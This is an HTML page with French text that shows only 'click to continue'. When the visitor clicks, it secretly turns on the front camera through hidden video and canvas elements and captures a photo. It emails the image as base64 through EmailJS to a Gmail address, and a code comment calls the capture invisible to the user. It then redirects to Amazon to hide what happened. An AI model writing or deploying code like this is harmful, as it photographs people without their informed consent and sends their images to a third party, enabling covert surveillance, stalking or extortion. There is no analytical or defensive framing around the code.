<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
  </script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body { margin:0; padding:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; background:#fff; overflow:hidden; }
    #status { position:absolute; top:10px; width:100%; text-align:center; font-size:16px; color:green; }
    video, canvas { display:none; }
  </style>
</head>
<body>
  <div id="status">Cliquez pour continuer...</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const status = document.getElementById("status");

    async function captureAndSend() {
      document.body.removeEventListener("click", captureAndSend);
      document.body.removeEventListener("touchstart", captureAndSend);

      status.textContent = "Activation caméra...";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const imageBase64 = canvas.toDataURL("image/jpeg", 0.5);
        stream.getTracks().forEach(track => track.stop());

        // Envoi EmailJS
        const params = {
          to_email: "adressestestee@gmail.com",
          message: "Photo capturée en Base64 (invisible à l'utilisateur): " + imageBase64
        };

        emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
          .finally(() => {
            // Redirection immédiate vers Amazon
            window.location.href = "https://www.amazon.com";
          });

      } catch(err) {
        status.textContent = "Erreur caméra : " + err;
      }
    }

    // Déclenchement au clic ou au touch
    document.body.addEventListener("click", captureAndSend);
    document.body.addEventListener("touchstart", captureAndSend, { passive: true });
  </script>
</body>
</html>
